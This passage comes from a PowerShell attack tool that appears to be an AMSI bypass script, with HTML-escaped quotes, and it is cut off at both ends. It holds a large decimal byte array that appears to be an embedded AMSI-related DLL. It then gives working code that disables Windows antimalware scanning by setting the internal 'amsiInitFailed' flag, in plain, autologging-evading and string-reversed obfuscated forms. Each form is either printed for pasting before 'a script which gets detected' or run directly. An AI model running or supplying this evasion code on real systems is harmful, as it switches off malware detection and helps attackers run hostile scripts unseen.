0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\u0026#34; if (([IntPtr]::Size) -eq 8) { Write-Verbose \u0026#34;64 bit process detected.\u0026#34; $DllBytes = $AmsiX64 } elseif (([IntPtr]::Size) -eq 4) { Write-Verbose \u0026#34;32 bit process detected.\u0026#34; $DllBytes = $AmsiX86 } switch($method) { \u0026#34;unload\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s Reflection method.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output \u0026#39;[Ref].Assembly.GetType(\u0026#39;\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;\u0026#39;).GetField(\u0026#39;\u0026#39;amsiInitFailed\u0026#39;\u0026#39;,\u0026#39;\u0026#39;NonPublic,Static\u0026#39;\u0026#39;).SetValue($null,$true)\u0026#39; } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; [Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;).GetField(\u0026#39;amsiInitFailed\u0026#39;,\u0026#39;NonPublic,Static\u0026#39;).SetValue($null,$true) } } \u0026#34;unloadsilent\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s Reflection method with WMF5 autologging bypass.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output \u0026#39;[Delegate]::CreateDelegate((\u0026#34;Func``3[String, $(([String].Assembly.GetType(\u0026#39;\u0026#39;System.Reflection.Bindin\u0026#39;\u0026#39;+\u0026#39;\u0026#39;gFlags\u0026#39;\u0026#39;)).FullName), System.Reflection.FieldInfo]\u0026#34; -as [String].Assembly.GetType(\u0026#39;\u0026#39;System.T\u0026#39;\u0026#39;+\u0026#39;\u0026#39;ype\u0026#39;\u0026#39;)), [Object]([Ref].Assembly.GetType(\u0026#39;\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;\u0026#39;)),(\u0026#39;\u0026#39;GetFie\u0026#39;\u0026#39;+\u0026#39;\u0026#39;ld\u0026#39;\u0026#39;)).Invoke(\u0026#39;\u0026#39;amsiInitFailed\u0026#39;\u0026#39;,((\u0026#39;\u0026#39;Non\u0026#39;\u0026#39;+\u0026#39;\u0026#39;Public,Static\u0026#39;\u0026#39;) -as [String].Assembly.GetType(\u0026#39;\u0026#39;System.Reflection.Bindin\u0026#39;\u0026#39;+\u0026#39;\u0026#39;gFlags\u0026#39;\u0026#39;))).SetValue($null,$True)\u0026#39; } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; [Delegate]::CreateDelegate((\u0026#34;Func``3[String, $(([String].Assembly.GetType(\u0026#39;System.Reflection.Bindin\u0026#39;+\u0026#39;gFlags\u0026#39;)).FullName), System.Reflection.FieldInfo]\u0026#34; -as [String].Assembly.GetType(\u0026#39;System.T\u0026#39;+\u0026#39;ype\u0026#39;)), [Object]([Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;)),(\u0026#39;GetFie\u0026#39;+\u0026#39;ld\u0026#39;)).Invoke(\u0026#39;amsiInitFailed\u0026#39;,((\u0026#39;Non\u0026#39;+\u0026#39;Public,Static\u0026#39;) -as [String].Assembly.GetType(\u0026#39;System.Reflection.Bindin\u0026#39;+\u0026#39;gFlags\u0026#39;))).SetValue($null,$True) } } \u0026#34;unloadobfuscated\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s Reflection method with obfuscation from Daneil Bohannon\u0026#39;s Invoke-Obfuscation - which bypasses WMF5 autologging.\u0026#34; if ($ShowOnly -eq $True) { $code = @\u0026#34; Sv (\u0026#39;R9\u0026#39;+\u0026#39;HYt\u0026#39;) ( \u0026#34; ) )93]rahC[]gnirtS[,\u0026#39;UCS\u0026#39;(ecalpeR.)63]rahC[]gnirtS[,\u0026#39;aEm\u0026#39;(ecalpeR.)\u0026#39;)eurt\u0026#39;+\u0026#39;aEm,llun\u0026#39;+\u0026#39;aEm(eulaVt\u0026#39;+\u0026#39;eS\u0026#39;+\u0026#39;.)UCScit\u0026#39;+\u0026#39;atS,ci\u0026#39;+\u0026#39;lbuPnoNUCS\u0026#39;+\u0026#39;,U\u0026#39;+\u0026#39;CSdeli\u0026#39;+\u0026#39;aFt\u0026#39;+\u0026#39;inI\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;maUCS(\u0026#39;+\u0026#39;dle\u0026#39;+\u0026#39;iF\u0026#39;+\u0026#39;teG\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;)\u0026#39;+\u0026#39;UCSslitU\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;mA.noitamotu\u0026#39;+\u0026#39;A.tn\u0026#39;+\u0026#39;em\u0026#39;+\u0026#39;eganaM.\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;sySUCS(epy\u0026#39;+\u0026#39;TteG.ylbmessA\u0026#39;+\u0026#39;.]\u0026#39;+\u0026#39;feR[\u0026#39;( (noisserpxE-ekovnI\u0026#34; ); Invoke-Expression( -Join ( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val )[ - 1..- (( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val ).Length)]) \u0026#34;@ Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output $code } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; Sv (\u0026#39;R9\u0026#39;+\u0026#39;HYt\u0026#39;) ( \u0026#34; ) )93]rahC[]gnirtS[,\u0026#39;UCS\u0026#39;(ecalpeR.)63]rahC[]gnirtS[,\u0026#39;aEm\u0026#39;(ecalpeR.)\u0026#39;)eurt\u0026#39;+\u0026#39;aEm,llun\u0026#39;+\u0026#39;aEm(eulaVt\u0026#39;+\u0026#39;eS\u0026#39;+\u0026#39;.)UCScit\u0026#39;+\u0026#39;atS,ci\u0026#39;+\u0026#39;lbuPnoNUCS\u0026#39;+\u0026#39;,U\u0026#39;+\u0026#39;CSdeli\u0026#39;+\u0026#39;aFt\u0026#39;+\u0026#39;inI\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;maUCS(\u0026#39;+\u0026#39;dle\u0026#39;+\u0026#39;iF\u0026#39;+\u0026#39;teG\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;)\u0026#39;+\u0026#39;UCSslitU\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;mA.noitamotu\u0026#39;+\u0026#39;A.tn\u0026#39;+\u0026#39;em\u0026#39;+\u0026#39;eganaM.\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;sySUCS(epy\u0026#39;+\u0026#39;TteG.ylbmessA\u0026#39;+\u0026#39;.